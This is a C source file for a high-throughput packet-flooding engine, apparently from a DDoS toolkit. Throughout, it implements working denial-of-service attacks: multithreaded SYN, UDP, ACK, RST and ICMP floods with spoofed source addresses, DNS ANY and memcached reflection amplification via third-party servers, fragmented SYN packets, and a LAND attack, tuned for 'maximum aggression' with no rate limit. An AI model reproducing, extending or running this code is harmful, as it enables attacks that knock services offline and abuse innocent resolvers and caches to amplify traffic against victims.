#include "engine.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <pthread.h>
#include <sched.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <netdb.h>

#define PKT_MAX 65535
#define BATCH_SIZE 1024
#define MAX_WORKERS 4096
#define BUF_RING_SZ 65536
#define BUF_SZ 128
#define SPOOF_POOL_SIZE 65536

extern volatile int g_engine_kill_flag;
int g_sock = -1;
static char g_err[256] = {0};
static uint32_t g_rng[128][4];
static __thread int g_tid = 0;
static uint32_t g_spoof_pool[SPOOF_POOL_SIZE];
static int g_spoof_count = 0;
static int g_raw_mode = 0;

/* Pre-computed template packets — zero packet building in hot path */
typedef struct {
    char hdr[sizeof(struct iphdr) + sizeof(struct tcphdr) + 12]; /* IP+TCP+options */
    int hdr_len;
    uint16_t src_port_off;
    uint16_t seq_off;
    uint16_t ip_id_off;
    uint16_t saddr_off;
} syn_template_t;
static __thread syn_template_t g_syn_tmpl;
static __thread int g_syn_tmpl_valid = 0;

static inline uint32_t xrand(void) {
    int i = g_tid & 127;
    uint32_t t = g_rng[i][0] ^ (g_rng[i][0] << 11);
    g_rng[i][0] = g_rng[i][1]; g_rng[i][1] = g_rng[i][2];
    g_rng[i][2] = g_rng[i][3];
    g_rng[i][3] = g_rng[i][3] ^ (g_rng[i][3] >> 19) ^ t ^ (t >> 8);
    return g_rng[i][3];
}

static inline uint32_t rand_spoof(void) {
    if (g_spoof_count > 0)
        return g_spoof_pool[xrand() % g_spoof_count];
    return xrand();
}

EXPORT void set_spoof_pool(uint32_t *pool, int count) {
    if (count > SPOOF_POOL_SIZE) count = SPOOF_POOL_SIZE;
    g_spoof_count = count;
    for (int i = 0; i < count; i++)
        g_spoof_pool[i] = pool[i];
}

EXPORT void seed_thread_rng(int tid, uint32_t seed) {
    g_tid = tid;
    int i = tid & 127;
    g_rng[i][0] = seed;
    g_rng[i][1] = seed * 2654435761u;
    g_rng[i][2] = seed * 2246822519u;
    g_rng[i][3] = seed * 3266489917u;
}

EXPORT const char *packet_error(void) { return g_err; }

/* Build syn template once — then just patch src_ip, src_port, seq, ip_id */
static void build_syn_template(uint32_t dst_ip, uint16_t dst_port) {
    struct iphdr *ip = (struct iphdr *)g_syn_tmpl.hdr;
    struct tcphdr *tcp = (struct tcphdr *)(g_syn_tmpl.hdr + sizeof(struct iphdr));
    uint8_t *opts = (uint8_t*)(g_syn_tmpl.hdr + sizeof(struct iphdr) + sizeof(struct tcphdr));
    int o = 0;
    opts[o++] = 2; opts[o++] = 4;
    opts[o++] = 0x05; opts[o++] = 0xB4; /* MSS=1460 */
    opts[o++] = 3; opts[o++] = 3; opts[o++] = 4; /* WS=4 */
    opts[o++] = 1; opts[o++] = 4; opts[o++] = 2; /* SACK */
    int pad = (4 - (o & 3)) & 3;
    for (int i = 0; i < pad; i++) opts[o++] = 1;
    int tcp_len = 20 + o;
    g_syn_tmpl.hdr_len = sizeof(struct iphdr) + tcp_len;

    ip->ihl = 5; ip->version = 4;
    ip->tot_len = htons(g_syn_tmpl.hdr_len);
    ip->frag_off = htons(0x4000);
    ip->ttl = 128;
    ip->tos = 0;
    ip->protocol = IPPROTO_TCP;
    ip->daddr = dst_ip;

    memset(tcp, 0, 20);
    tcp->dest = htons(dst_port);
    tcp->seq = 0;
    tcp->doff = tcp_len/4;
    tcp->syn = 1;
    tcp->window = htons(65535);
    tcp->urg_ptr = 0;

    g_syn_tmpl.src_port_off = sizeof(struct iphdr) + 0;    /* tcp->source */
    g_syn_tmpl.seq_off      = sizeof(struct iphdr) + 4;    /* tcp->seq */
    g_syn_tmpl.ip_id_off    = 4;                            /* ip->id */
    g_syn_tmpl.saddr_off    = 12;                           /* ip->saddr */
    g_syn_tmpl_valid = 1;
}

/* Fast patch: copy template, randomize src_ip, src_port, seq, ip_id, recalc checksum */
static inline void patch_syn(char *buf, uint32_t src) {
    memcpy(buf, g_syn_tmpl.hdr, g_syn_tmpl.hdr_len);
    uint32_t sport = (uint32_t)(1024 + (xrand() % 64511));
    uint32_t seq = xrand();
    *(uint16_t*)(buf + g_syn_tmpl.src_port_off) = htons((uint16_t)sport);
    *(uint32_t*)(buf + g_syn_tmpl.seq_off) = seq;
    *(uint16_t*)(buf + g_syn_tmpl.ip_id_off) = htons((uint16_t)(xrand() & 0xFFFF));
    *(uint32_t*)(buf + g_syn_tmpl.saddr_off) = src;
    /* IP checksum (only changed fields: id, saddr) */
    struct iphdr *ip = (struct iphdr*)buf;
    uint32_t ck = 0;
    uint16_t *w = (uint16_t*)ip;
    for (int i = 0; i < 10; i++) ck += w[i];
    while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
    ip->check = (uint16_t)~ck;
    /* TCP checksum (pseudo-header + full TCP) */
    uint32_t saddr = src, daddr = ip->daddr;
    uint16_t tcp_len = g_syn_tmpl.hdr_len - 20;
    uint32_t pseudo = (saddr >> 16) + (saddr & 0xFFFF) +
                      (daddr >> 16) + (daddr & 0xFFFF) +
                      IPPROTO_TCP + htons(tcp_len);
    while (pseudo >> 16) pseudo = (pseudo & 0xFFFF) + (pseudo >> 16);
    uint32_t csum = pseudo;
    struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
    uint16_t *tw = (uint16_t*)tcp;
    for (int i = 0; i < tcp_len/2; i++) csum += tw[i];
    while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16);
    tcp->check = (uint16_t)~csum;
}

/* UDP flood — random payload, no ratelimit */
static inline void build_udp_payload(char *buf, int size) {
    uint32_t base = xrand();
    for (int j = 0; j < size; j++)
        buf[j] = (base + j * 7) ^ (j * 13);
}

EXPORT int init_raw_socket(void) {
    if (g_sock >= 0) close_raw_socket();
    g_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (g_sock < 0) {
        snprintf(g_err, sizeof(g_err), "socket: need root (CAP_NET_RAW)");
        return -1;
    }
    int on = 1;
    setsockopt(g_sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    int pmtu = IP_PMTUDISC_DONT;
    setsockopt(g_sock, IPPROTO_IP, IP_MTU_DISCOVER, &pmtu, sizeof(pmtu));
    int sndbuf = 128 * 1024 * 1024;
    setsockopt(g_sock, SOL_SOCKET, SO_SNDBUFFORCE, &sndbuf, sizeof(sndbuf));
    g_raw_mode = 1;
    return 0;
}

EXPORT int init_raw_socket_tid(int tid) {
    seed_thread_rng(tid, (uint32_t)(time(NULL) ^ (tid * 1234567)));
    return init_raw_socket();
}

EXPORT int init_udp_socket(void) {
    if (g_sock >= 0) close_raw_socket();
    g_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (g_sock < 0) { snprintf(g_err, sizeof(g_err), "socket: %s", strerror(errno)); return -1; }
    int sndbuf = 64 * 1024 * 1024;
    setsockopt(g_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    g_raw_mode = 0;
    return 0;
}

EXPORT int is_raw_mode(void) { return g_raw_mode; }
EXPORT void close_raw_socket(void) { if (g_sock >= 0) { close(g_sock); g_sock = -1; } }

EXPORT uint32_t resolve_ip(const char *name) {
    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(name, NULL, &hints, &res) != 0) {
        uint32_t a = inet_addr(name);
        if (a == INADDR_NONE) return 0;
        return a;
    }
    uint32_t ip = ((struct sockaddr_in*)res->ai_addr)->sin_addr.s_addr;
    freeaddrinfo(res);
    return ip;
}

/* ──────────────── PRE-ALLOCATED BUFFER RING ──────────────── */
struct buf_ring {
    char data[BUF_RING_SZ][BUF_SZ + 64]; /* extra for IP+UDP headers */
    int lens[BUF_RING_SZ];
    int head;
    int count;
};

struct thread_worker {
    int sock;
    volatile int running;
    pthread_t thread;
    volatile uint64_t sent;
    uint32_t target_ip;
    uint16_t target_port;
    int method;
    int size;
    struct buf_ring ring;
    int sock_raw; /* 1=raw, 0=dgram */
};

static volatile int g_pool_running[4] = {0,0,0,0};
static struct thread_worker *g_pools[4] = {NULL, NULL, NULL, NULL};
static volatile int g_pool_offsets[4] = {0,0,0,0};
static int g_pool_capacities[4] = {0,0,0,0};

/* ──────────────── OPTIMAL SOCKET CREATION ──────────────── */
static int make_sock(int want_raw) {
    if (want_raw) {
        int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (s < 0) return -1;
        int on = 1;
        setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
        int pmtu = IP_PMTUDISC_DONT;
        setsockopt(s, IPPROTO_IP, IP_MTU_DISCOVER, &pmtu, sizeof(pmtu));
        int buf = 128 * 1024 * 1024;
        setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
        return s;
    }
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) return -1;
    int buf = 128 * 1024 * 1024;
    setsockopt(s, SOL_SOCKET, SO_SNDBUFFORCE, &buf, sizeof(buf));
    return s;
}

/* ──────────────── WORKER LOOP — MAXIMUM AGGRESSION ──────────────── */
static void *worker_loop(void *arg) {
    struct thread_worker *w = (struct thread_worker*)arg;
    static int g_gtid = 0;
    int tid = __atomic_fetch_add(&g_gtid, 1, __ATOMIC_RELAXED);
    seed_thread_rng(tid, (uint32_t)(time(NULL) ^ (tid * 1234567)));

    /* Pin to core for maximum L1/L2 cache locality */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(tid % sysconf(_SC_NPROCESSORS_ONLN), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);

    /* Raise priority to max */
    struct sched_param sp;
    sp.sched_priority = sched_get_priority_max(SCHED_FIFO);
    pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);

    /* Open socket */
    int want_raw = (w->method != 1 && w->method != 4);
    if (want_raw && w->method == 1) want_raw = 0;
    if (want_raw && w->method == 4) want_raw = 0;
    w->sock = make_sock(want_raw);
    if (w->sock < 0) { w->running = 0; return NULL; }
    w->sock_raw = want_raw;

    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovecs[BATCH_SIZE];
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(w->target_port);
    dst.sin_addr.s_addr = w->target_ip;

    /* Pre-build SYN template for this target */
    g_syn_tmpl_valid = 0;
    if (want_raw)
        build_syn_template(w->target_ip, w->target_port);

    /* Pre-allocate large UDP payload buffer */
    char *udp_payload = NULL;
    int udp_payload_len = w->size;
    if (udp_payload_len < 1) udp_payload_len = 64;
    if (udp_payload_len > 65000) udp_payload_len = 65000;
    udp_payload = (char*)malloc(udp_payload_len);

    while (w->running) {
        /* Build batch of 1024 then sendmmsg — retry unsent portion */
        int batch = 0;
        if (!want_raw) {
            while (batch < BATCH_SIZE) {
                iovecs[batch].iov_base = udp_payload;
                iovecs[batch].iov_len = udp_payload_len;
                msgs[batch].msg_hdr.msg_name = &dst;
                msgs[batch].msg_hdr.msg_namelen = sizeof(dst);
                msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
                msgs[batch].msg_hdr.msg_iovlen = 1;
                batch++;
            }
        } else if (g_syn_tmpl_valid) {
            while (batch < BATCH_SIZE) {
                iovecs[batch].iov_base = w->ring.data[batch];
                iovecs[batch].iov_len = g_syn_tmpl.hdr_len;
                w->ring.lens[batch] = g_syn_tmpl.hdr_len;
                msgs[batch].msg_hdr.msg_name = &dst;
                msgs[batch].msg_hdr.msg_namelen = sizeof(dst);
                msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
                msgs[batch].msg_hdr.msg_iovlen = 1;
                batch++;
                patch_syn(w->ring.data[batch-1], rand_spoof());
            }
        } else {
            while (batch < BATCH_SIZE) {
                int plen;
                uint32_t src = rand_spoof();
                char *buf = w->ring.data[batch];
                struct iphdr *ip = (struct iphdr*)buf;
                struct udphdr *udp = (struct udphdr*)(buf + 20);
                plen = 20 + 8 + udp_payload_len;
                ip->ihl = 5; ip->version = 4;
                ip->tot_len = htons(plen);
                ip->id = htons((uint16_t)(xrand() & 0xFFFF));
                ip->frag_off = htons(0x4000);
                ip->ttl = 128; ip->tos = 0;
                ip->protocol = IPPROTO_UDP;
                ip->saddr = src;
                ip->daddr = w->target_ip;
                uint32_t ck = 0; uint16_t *wp = (uint16_t*)ip;
                for (int i = 0; i < 10; i++) ck += wp[i];
                while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16);
                ip->check = (uint16_t)~ck;
                udp->source = htons((uint16_t)(1024 + (xrand() % 64511)));
                udp->dest = htons(w->target_port);
                udp->len = htons(8 + udp_payload_len);
                udp->check = 0;
                memcpy(buf + 28, udp_payload, udp_payload_len);
                iovecs[batch].iov_base = buf;
                iovecs[batch].iov_len = plen;
                w->ring.lens[batch] = plen;
                msgs[batch].msg_hdr.msg_name = &dst;
                msgs[batch].msg_hdr.msg_namelen = sizeof(dst);
                msgs[batch].msg_hdr.msg_iov = &iovecs[batch];
                msgs[batch].msg_hdr.msg_iovlen = 1;
                batch++;
            }
        }

        int remaining = batch;
        int off = 0;
        while (remaining > 0) {
            int ret = sendmmsg(w->sock, msgs + off, remaining, MSG_DONTWAIT);
            if (ret > 0) {
                __sync_fetch_and_add(&w->sent, ret);
                off += ret;
                remaining -= ret;
            } else {
                /* EAGAIN: kernel buffer full, spin until it drains */
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    continue;
                }
                break;
            }
        }
    }

    free(udp_payload);
    close(w->sock);
    w->running = 0;
    return NULL;
}

static int method_pool(int m) {
    if (m == 0 || m == 10) return 0;
    if (m == 1) return 1;
    if (m == 2) return 2;
    return 3;
}

EXPORT int start_batch_flood(uint32_t target_ip, uint16_t target_port, int method, int workers, int size, int duration_sec) {
    int pool_id = method_pool(method);
    if (g_pool_running[pool_id]) return -1;
    if (workers > MAX_WORKERS) workers = MAX_WORKERS;
    if (workers > g_pool_capacities[pool_id]) {
        free(g_pools[pool_id]);
        g_pools[pool_id] = (struct thread_worker*)calloc(workers, sizeof(struct thread_worker));
        g_pool_capacities[pool_id] = workers;
        if (!g_pools[pool_id]) return -1;
    }
    g_pool_running[pool_id] = 1;
    g_pool_offsets[pool_id] = workers;
    struct thread_worker *pool = g_pools[pool_id];
    int ncpus = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpus < 1) ncpus = 1;
    for (int i = 0; i < workers; i++) {
        memset(&pool[i], 0, sizeof(pool[i]));
        pool[i].running = 1;
        pool[i].target_ip = target_ip;
        pool[i].target_port = target_port;
        pool[i].method = method;
        pool[i].size = size;
        pool[i].sent = 0;
        pthread_create(&pool[i].thread, NULL, worker_loop, &pool[i]);
    }
    return workers;
}

EXPORT int stop_batch_flood(void) {
    for (int p = 0; p < 4; p++) {
        if (!g_pool_running[p]) continue;
        struct thread_worker *pool = g_pools[p];
        for (int i = 0; i < g_pool_offsets[p]; i++)
            pool[i].running = 0;
        for (int i = 0; i < g_pool_offsets[p]; i++) {
            if (pool[i].thread) {
                pthread_join(pool[i].thread, NULL);
                pool[i].thread = 0;
            }
        }
        g_pool_running[p] = 0;
        g_pool_offsets[p] = 0;
    }
    return 0;
}

EXPORT int get_raw_socket(void) { return g_sock; }

EXPORT uint64_t batch_flood_sent(void) {
    uint64_t total = 0;
    for (int p = 0; p < 4; p++) {
        struct thread_worker *pool = g_pools[p];
        if (!pool) continue;
        for (int i = 0; i < g_pool_offsets[p]; i++)
            total += pool[i].sent;
    }
    return total;
}

/* ──────────────── LEGACY — SINGLE-PACKET FLOOD (no delay) ──────────────── */
EXPORT int syn_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay) {
    (void)delay;
    char buf[PKT_MAX]; int plen;
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    build_syn_template(target, port);
    for (int i = 0; i < count; i++) {
        patch_syn(buf, spoof ? spoof : rand_spoof());
        if (sendto(g_sock, buf, g_syn_tmpl.hdr_len, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
    }
    return sent;
}

EXPORT int udp_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay, int size) {
    (void)delay;
    char buf[PKT_MAX]; int plen;
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    if (size < 1) size = 1024;
    if (size > 65000) size = 65000;
    for (int i = 0; i < count; i++) {
        uint32_t src = spoof ? spoof : rand_spoof();
        plen = 20 + 8 + size;
        struct iphdr *ip = (struct iphdr*)buf;
        struct udphdr *udp = (struct udphdr*)(buf + 20);
        ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
        ip->id = htons((uint16_t)(xrand() & 0xFFFF)); ip->frag_off = htons(0x4000);
        ip->ttl = 128; ip->tos = 0; ip->protocol = IPPROTO_UDP;
        ip->saddr = src; ip->daddr = target;
        { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int j = 0; j < 10; j++) ck += w[j];
          while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
        udp->source = htons((uint16_t)(1024 + (xrand() % 64511)));
        udp->dest = htons(port); udp->len = htons(8 + size); udp->check = 0;
        build_udp_payload(buf + 28, size);
        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
    }
    return sent;
}

EXPORT int ack_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay) {
    (void)delay;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    build_syn_template(target, port);
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    for (int i = 0; i < count; i++) {
        char buf[PKT_MAX];
        patch_syn(buf, spoof ? spoof : rand_spoof());
        struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
        tcp->syn = 0; tcp->ack = 1;
        tcp->ack_seq = xrand();
        if (sendto(g_sock, buf, g_syn_tmpl.hdr_len, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
    }
    return sent;
}

EXPORT int rst_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay) {
    (void)delay;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    build_syn_template(target, port);
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    for (int i = 0; i < count; i++) {
        char buf[PKT_MAX];
        patch_syn(buf, spoof ? spoof : rand_spoof());
        struct tcphdr *tcp = (struct tcphdr*)(buf + 20);
        tcp->syn = 0; tcp->rst = 1;
        if (sendto(g_sock, buf, g_syn_tmpl.hdr_len, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
    }
    return sent;
}

EXPORT int icmp_flood(uint32_t target, uint32_t spoof, int count, int delay) {
    (void)delay;
    char buf[PKT_MAX];
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_addr.s_addr = target;
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    for (int i = 0; i < count; i++) {
        uint32_t src = spoof ? spoof : rand_spoof();
        int plen = 20 + 8 + 56;
        struct iphdr *ip = (struct iphdr*)buf;
        struct icmphdr *icmp = (struct icmphdr*)(buf + 20);
        memset(buf + 20, 0, 64);
        ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
        ip->id = htons((uint16_t)(xrand() & 0xFFFF)); ip->frag_off = 0;
        ip->ttl = 64; ip->protocol = IPPROTO_ICMP;
        ip->saddr = src; ip->daddr = target;
        { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int j = 0; j < 10; j++) ck += w[j];
          while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
        icmp->type = ICMP_ECHO;
        { uint32_t csum = 0; uint16_t *iw = (uint16_t*)icmp; for (int j = 0; j < 32; j++) csum += iw[j];
          while (csum >> 16) csum = (csum & 0xFFFF) + (csum >> 16); icmp->checksum = (uint16_t)~csum; }
        if (sendto(g_sock, buf, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
    }
    return sent;
}

/* Amplification */
static uint16_t dns_id = 0xDEAD;

EXPORT int dns_any_amp(uint32_t target, uint32_t spoof, const char *server, int count, int delay) {
    (void)delay;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(53);
    dst.sin_addr.s_addr = resolve_ip(server);
    if (dst.sin_addr.s_addr == 0) { close(sock); return -1; }

    unsigned char qbuf[64];
    uint32_t src = spoof ? spoof : rand_spoof();
    int sent = 0;
    for (int i = 0; i < count; i++) {
        memset(qbuf, 0, 64);
        dns_id++;
        qbuf[0] = (dns_id >> 8) & 0xFF; qbuf[1] = dns_id & 0xFF;
        qbuf[2] = 0x01; qbuf[3] = 0x00;
        qbuf[4] = 0x00; qbuf[5] = 0x01;
        qbuf[6] = 0x00; qbuf[7] = 0x00;
        qbuf[8] = 0x00; qbuf[9] = 0x00;
        qbuf[10] = 0x00; qbuf[11] = 0x00;
        int off = 12;
        const char *labels[] = {"isc", "org", NULL};
        for (int l = 0; labels[l]; l++) {
            int ll = strlen(labels[l]);
            qbuf[off++] = ll;
            memcpy(qbuf + off, labels[l], ll);
            off += ll;
        }
        qbuf[off++] = 0x00;
        qbuf[off++] = 0x00; qbuf[off++] = 0xFF;
        qbuf[off++] = 0x00; qbuf[off++] = 0x01;

        if (g_raw_mode) {
            char pkt[PKT_MAX];
            int plen = 20 + 8 + off;
            struct iphdr *ip = (struct iphdr*)pkt;
            struct udphdr *udp = (struct udphdr*)(pkt + 20);
            ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
            ip->id = htons((uint16_t)(xrand() & 0xFFFF)); ip->frag_off = htons(0x4000);
            ip->ttl = 128; ip->protocol = IPPROTO_UDP;
            ip->saddr = src; ip->daddr = dst.sin_addr.s_addr;
            { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int j = 0; j < 10; j++) ck += w[j];
              while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
            udp->source = htons((uint16_t)(1024 + (xrand() % 64511)));
            udp->dest = htons(53); udp->len = htons(8 + off);
            memcpy(pkt + 28, qbuf, off);
            sendto(g_sock, pkt, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
        } else {
            sendto(sock, qbuf, off, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
        }
        sent++;
    }
    close(sock);
    return sent;
}

EXPORT int memcached_amp(uint32_t target, uint32_t spoof, const char *server, int count, int delay) {
    (void)delay;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(11211);
    dst.sin_addr.s_addr = resolve_ip(server);
    if (dst.sin_addr.s_addr == 0) { close(sock); return -1; }

    unsigned char req[] = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n";
    int reqlen = 15;
    uint32_t src = spoof ? spoof : rand_spoof();
    int sent = 0;
    for (int i = 0; i < count; i++) {
        if (g_raw_mode) {
            char pkt[PKT_MAX];
            int plen = 20 + 8 + reqlen;
            struct iphdr *ip = (struct iphdr*)pkt;
            struct udphdr *udp = (struct udphdr*)(pkt + 20);
            ip->ihl = 5; ip->version = 4; ip->tot_len = htons(plen);
            ip->id = htons((uint16_t)(xrand() & 0xFFFF)); ip->frag_off = htons(0x4000);
            ip->ttl = 128; ip->protocol = IPPROTO_UDP;
            ip->saddr = src; ip->daddr = dst.sin_addr.s_addr;
            { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int j = 0; j < 10; j++) ck += w[j];
              while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
            udp->source = htons((uint16_t)(1024 + (xrand() % 64511)));
            udp->dest = htons(11211); udp->len = htons(8 + reqlen);
            memcpy(pkt + 28, req, reqlen);
            sendto(g_sock, pkt, plen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
        } else {
            sendto(sock, req, reqlen, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
        }
        sent++;
    }
    close(sock);
    return sent;
}

/* IP fragmentation */
EXPORT int send_fragmented_syn(uint32_t target, uint16_t port, uint32_t spoof) {
    char buf[PKT_MAX]; int plen;
    uint32_t src = spoof ? spoof : rand_spoof();
    if (g_sock < 0) return -1;
    build_syn_template(target, port);
    patch_syn(buf, src);
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    uint16_t ip_id = xrand() & 0xFFFF;
    int frag_size = g_syn_tmpl.hdr_len / 2;
    struct iphdr *ip = (struct iphdr*)buf;
    ip->id = htons(ip_id); ip->frag_off = htons(0x2000); ip->tot_len = htons(frag_size);
    { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int i = 0; i < 10; i++) ck += w[i];
      while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
    sendto(g_sock, buf, frag_size, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
    memmove(buf, buf + frag_size, g_syn_tmpl.hdr_len - frag_size);
    memset(buf + (g_syn_tmpl.hdr_len - frag_size), 0, frag_size);
    ip = (struct iphdr*)buf;
    ip->id = htons(ip_id); ip->frag_off = 0; ip->tot_len = htons(g_syn_tmpl.hdr_len - frag_size);
    { uint32_t ck = 0; uint16_t *w = (uint16_t*)ip; for (int i = 0; i < 10; i++) ck += w[i];
      while (ck >> 16) ck = (ck & 0xFFFF) + (ck >> 16); ip->check = (uint16_t)~ck; }
    sendto(g_sock, buf, g_syn_tmpl.hdr_len - frag_size, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst));
    return 2;
}

EXPORT int land_attack(uint32_t target, uint16_t port, int count) {
    int sent = 0;
    if (g_sock < 0 && init_raw_socket() < 0) return -1;
    build_syn_template(target, port);
    struct sockaddr_in dst; dst.sin_family = AF_INET; dst.sin_port = htons(port); dst.sin_addr.s_addr = target;
    for (int i = 0; i < count; i++) {
        char buf[PKT_MAX];
        patch_syn(buf, target);
        if (sendto(g_sock, buf, g_syn_tmpl.hdr_len, MSG_DONTWAIT, (struct sockaddr*)&dst, sizeof(dst)) > 0) sent++;
    }
    return sent;
}

EXPORT int syn_flood_raw(uint32_t target, uint16_t port, uint32_t spoof, int count) {
    return syn_flood(target, port, spoof, count, 0);
}
